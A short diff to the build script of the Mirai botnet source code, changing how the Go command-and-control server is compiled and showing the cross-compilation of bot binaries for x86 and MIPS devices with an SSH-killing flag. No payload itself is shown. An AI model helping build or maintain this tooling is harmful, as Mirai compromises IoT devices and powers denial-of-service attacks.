@@ -24,7 +24,10 @@ if [ $# == 0 ]; then
 elif [ "$1" == "release" ]; then
     rm release/mirai.*
     rm release/miraint.*
-    go build -o release/cnc cnc/*.go
+    (
+    cd cnc
+    go build -o ../release/cnc
+    )
     compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
